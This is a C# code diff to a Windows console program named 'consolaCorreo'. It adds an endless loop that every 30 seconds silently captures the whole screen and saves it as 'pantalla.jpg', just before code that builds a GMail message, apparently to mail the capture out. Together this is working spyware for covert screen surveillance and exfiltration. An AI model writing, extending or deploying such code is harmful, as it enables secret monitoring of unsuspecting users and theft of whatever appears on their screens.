@@ -1,6 +1,7 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Drawing;
 using System.Linq;
 using System.Net.Mail;
 using System.Text;
@@ -25,7 +26,14 @@ namespace consolaCorreo
         {
             while (true)
             {
-                System.Threading.Thread.Sleep(300000);
+
+                System.Threading.Thread.Sleep(30000);
+                Bitmap ScreenToBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                System.Drawing.Graphics.FromImage(ScreenToBitmap).CopyFromScreen(
+                        new Point(0, 0),
+                        new Point(0, 0),
+                        new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
+                ScreenToBitmap.Save(System.Windows.Forms.Application.StartupPath + "pantalla.jpg");
                 GMail Cr = new GMail();
                 MailMessage mnsj = new MailMessage();
                 mnsj.Subject = "pruebaJorge";
